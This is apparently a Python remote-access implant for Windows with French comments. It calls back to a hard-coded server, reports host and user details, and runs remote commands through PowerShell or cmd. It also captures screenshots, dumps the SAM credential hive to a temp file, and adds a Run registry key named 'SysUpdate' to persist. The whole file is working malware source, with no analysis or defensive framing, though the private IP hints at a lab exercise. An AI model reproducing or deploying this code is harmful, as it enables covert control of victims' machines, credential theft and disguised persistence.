import socket
import platform
import psutil
import subprocess
import json
import time
import os
import base64
import io
import getpass
import winreg
from datetime import datetime

try:
    from PIL import ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

SERVER_IP = "192.168.128.129"  # C'est bien ça ?
SERVER_PORT = 5000
RECONNECT_DELAY = 5


def log(msg):
    print(f"[{datetime.now():%H:%M:%S}] {msg}", flush=True)


def send_line(sock, obj):
    sock.sendall((json.dumps(obj) + "\n").encode("utf-8"))


def recv_line(fileobj):
    line = fileobj.readline()
    if not line:
        return None
    return json.loads(line.decode("utf-8"))


# -------------------- INFOS MACHINE --------------------
def get_network_interfaces():
    result = []
    for name, addresses in psutil.net_if_addrs().items():
        for a in addresses:
            if a.family == socket.AF_INET and not a.address.startswith(
                ("127.", "169.254.")
            ):
                result.append({"interface": name, "ipv4": a.address})
    return result


def get_hello():
    return {
        "type": "hello",
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "system": platform.system(),
        "distribution": platform.platform(),
        "architecture": platform.machine(),
        "interfaces": get_network_interfaces(),
    }


# -------------------- COMMANDES --------------------
def run_shell(cmd: str) -> str:
    try:
        out = subprocess.check_output(
            ["powershell", "-NoProfile", "-Command", cmd],
            stderr=subprocess.STDOUT, timeout=30
        )
        return out.decode(errors="ignore")
    except Exception:
        try:
            out = subprocess.check_output(
                ["cmd", "/c", cmd],
                stderr=subprocess.STDOUT, timeout=30
            )
            return out.decode(errors="ignore")
        except Exception as e:
            return f"[!] {type(e).__name__}: {e}"


# -------------------- SCREENSHOT --------------------
def take_screenshot() -> str:
    if not HAS_PIL:
        return "[!] pillow non installé (pip install pillow)"
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        return base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        return f"[!] {e}"


# -------------------- SAM --------------------
def dump_sam():
    try:
        out = os.path.join(os.environ.get("TEMP", "C:\\"), "sam.hiv")
        r = subprocess.run(
            ["reg", "save", "HKLM\\SAM", out, "/y"],
            capture_output=True, text=True, timeout=20
        )
        if r.returncode != 0:
            return f"[!] admin requis : {r.stderr.strip()}"
        return f"[+] SAM exportée : {out} ({os.path.getsize(out)} o)"
    except Exception as e:
        return f"[!] {type(e).__name__}: {e}"


# -------------------- REGISTRE --------------------
def add_registry_key():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        script = os.path.abspath(__file__)
        cmd = f'pythonw "{script}"'
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE
        ) as k:
            winreg.SetValueEx(k, "SysUpdate", 0, winreg.REG_SZ, cmd)
        return f"[+] Clé Run\\SysUpdate ajoutée : {cmd}"
    except Exception as e:
        return f"[!] {type(e).__name__}: {e}"


# -------------------- DISPATCH --------------------
def dispatch(msg):
    t = msg.get("type")
    try:
        if t == "command":    return run_shell(msg.get("command", ""))
        if t == "screenshot": return take_screenshot()
        if t == "enum":       return {"sam": dump_sam(), "reg": add_registry_key()}
        if t == "sam":        return dump_sam()
        if t == "reg":        return add_registry_key()
        if t == "persist":    return add_registry_key()
        return f"[!] type inconnu : {t}"
    except Exception as e:
        return f"[!] {type(e).__name__}: {e}"


# -------------------- BOUCLE --------------------
def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            log(f"[+] connecté à {SERVER_IP}:{SERVER_PORT}")
            return s
        except Exception as e:
            log(f"[!] reconnexion {RECONNECT_DELAY}s : {e}")
            time.sleep(RECONNECT_DELAY)


def main():
    while True:
        s = connect()
        try:
            send_line(s, get_hello())
            f = s.makefile("rb")
            while True:
                msg = recv_line(f)
                if msg is None:
                    log("[-] serveur déconnecté")
                    break
                log(f"[>] {msg.get('type')}")
                send_line(s, {"type": "command_result", "result": dispatch(msg)})
        except Exception as e:
            log(f"[!] {type(e).__name__}: {e}")
        finally:
            s.close()
        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    main()